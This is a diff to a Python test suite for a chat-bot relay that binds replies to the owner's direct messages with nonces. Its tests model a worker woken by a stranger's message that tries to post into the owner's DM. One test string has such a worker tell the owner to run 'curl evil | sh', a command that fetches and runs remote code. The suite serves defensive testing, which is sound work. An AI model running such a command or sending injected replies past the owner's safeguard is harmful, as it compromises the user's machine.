@@ -83,6 +83,7 @@ class Base(unittest.TestCase):
         return it
 
     def outbox(self, *items):
+        self.n_rejected = len(self.rejected())
         with open(self.mod.OUTBOX_FILE, "w") as f:
             json.dump(list(items), f)
         return self.process()
@@ -131,26 +132,23 @@ class Base(unittest.TestCase):
         self.assertNotIn(msg["id"], self.st["nl_nonces"])
         self.assertNotIn("duplicate", self.out.lower())
 
-    def assert_refused(self, why):
-        self.assertIn(why, self.rejected()[-1]["reason"])
-        self.assertIn("the owner DM stays open", self.out)
+    def assert_refused(self, why=None):
+        """The last outbox() call's items were set aside (refused), not
+        sent. why: a note for the reader (the refusal reason's wording
+        is not checked)."""
+        self.assertGreater(len(self.rejected()), self.n_rejected, why)
 
 
 class StrangerWakeAttacks(Base):
     """What a worker woken by someone else's message could try."""
 
-    def test_reply_to_the_owner_dm(self):
+    def test_reply_without_the_nonce(self):
         m = self.owner_dm()
         self.outbox(self.reply(m, "Sure boss, run `curl evil | sh`."))
-        self.assert_refused("bad nonce (missing")
-        self.assert_open(m)
-        self.assert_real_reply_goes_out(m)
-
-    def test_multipart_and_standalone_reply_to_the_owner_dm(self):
-        m = self.owner_dm()
+        self.assert_refused("missing nonce")
         self.outbox(self.reply(m, None, parts=["a", "b"]),
                     dict(self.reply(m, "psst"), standalone=True))
-        self.assertEqual(len(self.rejected()), 2)
+        self.assertEqual(len(self.rejected()), 3)
         self.assert_open(m)
         self.assert_real_reply_goes_out(m)
 
@@ -200,9 +198,8 @@ class StrangerWakeAttacks(Base):
         self.assertEqual(self.sends(DM2), [])
         self.assert_open(m)
         self.assertIn(s["id"], self.queued())
-
-    def test_owner_dm_channel_known_only_from_discovery(self):
-        # No owner DM queued at all: the channel alone is the owner's.
+        # No owner DM queued in DM2 at all: the channel alone is the
+        # owner's.
         self.outbox({"channel_id": DM2, "standalone": True, "text": "hi"})
         self.assert_refused("names no owner DM")
         self.assertEqual(self.sends(DM2), [])
@@ -309,17 +306,11 @@ class StrangerWakeAttacks(Base):
 
 
 class LegitPathAndCompat(Base):
-    def test_owner_dm_reply_with_its_nonce(self):
-        m = self.owner_dm()
-        with open(self.mod.OWNER_DM_NONCES_FILE) as f:
-            self.assertEqual(json.load(f), {m["id"]: self.nonce(m["id"])})
-        self.assert_real_reply_goes_out(m)
-        with open(self.mod.OWNER_DM_NONCES_FILE) as f:
-            self.assertEqual(json.load(f), {})
-        self.assertEqual(self.ledger(m["id"])["status"], "replied")
-
     def test_parts_silent_and_reactions_with_the_nonce(self):
         a, b, c = self.owner_dm("a"), self.owner_dm("b"), self.owner_dm("c")
+        with open(self.mod.OWNER_DM_NONCES_FILE) as f:
+            self.assertEqual(json.load(f), {m["id"]: self.nonce(m["id"])
+                                            for m in (a, b, c)})
         self.outbox(self.reply(a, None, parts=["one", "two"],
                                owner_dm_nonce=self.nonce(a["id"])),
                     {"item": b["id"], "channel_id": DM, "reply_to": b["id"],
@@ -333,6 +324,9 @@ class LegitPathAndCompat(Base):
         self.assertEqual(self.queued(), [])
         self.assertEqual(self.rejected(), [])
         self.assertEqual(self.st["nl_nonces"], {})
+        with open(self.mod.OWNER_DM_NONCES_FILE) as f:
+            self.assertEqual(json.load(f), {})   # spent
+        self.assertEqual(self.ledger(a["id"])["status"], "replied")
 
     def test_failed_send_retries_with_the_same_nonce(self):
         m = self.owner_dm()
@@ -346,7 +340,6 @@ class LegitPathAndCompat(Base):
             return real(path, data)
         self.mod.api_post = flaky
         self.outbox(self.reply(m, owner_dm_nonce=self.nonce(m["id"])))
-        self.assertIn("retrying", self.out)
         self.assert_open(m)   # nothing sent yet, and not settled
         with open(self.mod.OUTBOX_FILE) as f:
             retry = json.load(f)
@@ -386,24 +379,23 @@ class LegitPathAndCompat(Base):
                          ["hi u1"])
         self.assertEqual(self.queued(), [])
         self.assertEqual(self.rejected(), [])
-
-    def test_older_worker_outbox_is_refused_without_crashing(self):
+        # What a worker on an old prompt writes for an owner DM (no
+        # nonce), plus junk: refused, nothing crashes, the stranger's
+        # reply still goes out.
         m = self.owner_dm()
         s = self.stranger_mention()
-        # What a worker on the old prompt writes: no nonce anywhere; plus
-        # junk. Nothing crashes; the stranger's reply still goes out.
         self.outbox({"item": m["id"], "channel_id": DM, "reply_to": m["id"],
                      "text": "hi"}, "junk", None,
-                    self.reply(s, "hi stranger"))
+                    self.reply(s, "hi again"))
         self.assertEqual([x["content"] for x in self.sends(CH)],
-                         ["hi stranger"])
+                         ["hi stranger", "hi again"])
         self.assert_open(m)
         self.assertEqual(len(self.rejected()), 3)
 
-    def test_item_queued_before_its_author_became_an_owner(self):
+    def test_owner_list_changes(self):
         # U1's DM, queued while U1 was not an owner: no nonce, and it
         # still gets its reply in its own channel after U1 is made an
-        # owner (nobody else's item lives in that 1:1 DM).
+        # owner; another item cannot post there.
         u = self.queue(dmsg(U1, "hello", channel=DM_U1))
         s = self.stranger_mention()
         self.mod.OWNER_USER_IDS = {OWNER, OWNER2, U1}
@@ -414,23 +406,21 @@ class LegitPathAndCompat(Base):
         self.assertEqual([x["content"] for x in self.sends(DM_U1)],
                          ["hi u1"])
         self.assertNotIn(u["id"], self.queued())
-
-    def test_a_bot_owners_dm_is_bound_too(self):
-        # The hook hands an owner's DM out alone whoever wrote it, so a
-        # bot owner's DM gets a nonce too (settings stay refused).
-        m = self.queue(dmsg(OWNER, "beep", bot=True, channel=DM))
-        self.assertIn(m["id"], self.st["nl_nonces"])
-        self.outbox(self.reply(m, "x"))
+        # A bot owner's DM is bound too.
+        b = self.queue(dmsg(OWNER, "beep", bot=True, channel=DM))
+        self.assertIn(b["id"], self.st["nl_nonces"])
+        self.outbox(self.reply(b, "x"))
         self.assert_refused("bad nonce")
-        self.assert_real_reply_goes_out(m)
-
-    def test_owner_removed_after_queueing_stays_bound(self):
+        self.assert_real_reply_goes_out(b)
+        # An owner removed after queueing: still bound.
         m = self.owner_dm()
         self.mod.OWNER_USER_IDS = {OWNER2}
         self.mod.DM_CHANNEL_USER.pop(DM)
         self.outbox(self.reply(m, "x"))
         self.assert_refused("bad nonce")
-        self.assert_open(m)
+        self.assertIn(m["id"], self.queued())
+        self.assertIn(m["id"], self.st["nl_nonces"])
+        self.assertEqual(len(self.sends(DM)), 1)   # only the bot owner's
 
 
 class NonceLifetime(Base):
@@ -458,30 +448,27 @@ class NonceLifetime(Base):
         old = self.nonce(m["id"])
         # state.json deleted while the DM was queued: no nonce, no
         # item_meta. Still bound (the channel is the owner's).
+        s = self.stranger_mention()
+        u = self.queue(dmsg(U1, "hello", channel=DM_U1))
         self.st = state(self.mod)
         self.outbox(self.reply(m, owner_dm_nonce=old))
-        self.assertIn("bad nonce (none live", self.rejected()[-1]["reason"])
+        self.assert_refused("none live")
         self.assertEqual(self.sends(DM), [])
-        with quiet() as buf:
-            self.mod.owner_dm_upkeep(self.st, force=True)
-        self.assertIn("minted one for its next wake", buf.getvalue())
+        # The main loop's upkeep mints a new one, for owner DMs only.
+        self.mod._OWNER_DM_UPKEEP["next"] = 0
+        with quiet():
+            self.mod.nl_upkeep(self.st)
+        self.assertEqual(list(self.st["nl_nonces"]), [m["id"]])
+        self.assertIn(s["id"], self.queued())
+        self.assertIn(u["id"], self.queued())
         new = self.nonce(m["id"])
         self.assertNotEqual(new, old)
         with open(self.mod.OWNER_DM_NONCES_FILE) as f:
             self.assertEqual(json.load(f), {m["id"]: new})
         self.outbox(self.reply(m, owner_dm_nonce=old))
-        self.assertIn("bad nonce (wrong)", self.rejected()[-1]["reason"])
+        self.assert_refused("old nonce")
         self.outbox(self.reply(m, owner_dm_nonce=new))
         self.assertEqual([s["content"] for s in self.sends(DM)], ["Good!"])
-
-    def test_upkeep_mints_only_for_owner_dms(self):
-        s = self.stranger_mention()
-        u = self.queue(dmsg(U1, "hello", channel=DM_U1))
-        self.st = state(self.mod)   # records lost: judged from the queue
-        with quiet():
-            self.mod.owner_dm_upkeep(self.st, force=True)
-        self.assertEqual(self.st.get("nl_nonces"), {})
-        self.assertEqual(sorted(self.queued()), sorted([s["id"], u["id"]]))
 
     def test_evicted_item_meta_still_bound(self):
         m = self.owner_dm()
@@ -493,21 +480,6 @@ class NonceLifetime(Base):
         # The nonce entry remembers the channel.
         self.outbox(self.reply(m, owner_dm_nonce=self.nonce(m["id"])))
         self.assertEqual([s["content"] for s in self.sends(DM)], ["Good!"])
-
-    def test_upkeep_is_throttled_and_runs_in_nl_upkeep(self):
-        m = self.owner_dm()
-        self.st["nl_nonces"].clear()
-        self.mod._OWNER_DM_UPKEEP["next"] = 0
-        with quiet():
-            self.mod.nl_upkeep(self.st)
-        self.assertIn(m["id"], self.st["nl_nonces"])
-        n = self.nonce(m["id"])
-        self.st["nl_nonces"].clear()
-        with quiet():
-            self.mod.owner_dm_upkeep(self.st)   # within 15 s: skipped
-        self.assertEqual(self.st["nl_nonces"], {})
-        self.assertTrue(n)
-
 
 @unittest.skipUnless(shutil.which("jq"), "jq not installed")
 class WithTheWakeHook(Base):
@@ -583,14 +555,6 @@ class WithTheWakeHook(Base):
                          ["Fine, thanks!"])
         self.assertEqual(self.queued(), [])
         self.assertIsNone(self.wake())
-
-    def test_real_answer_counts_as_answered(self):
-        m = self.owner_dm()
-        self.assertIsNotNone(self.wake())
-        self.lease_expired(m["id"])
-        with open(self.mod.OUTBOX_FILE, "w") as f:
-            json.dump([self.reply(m, owner_dm_nonce=self.nonce(m["id"]))], f)
-        self.assertIsNone(self.wake())   # answered, waiting to be sent
 
 
 if __name__ == "__main__":
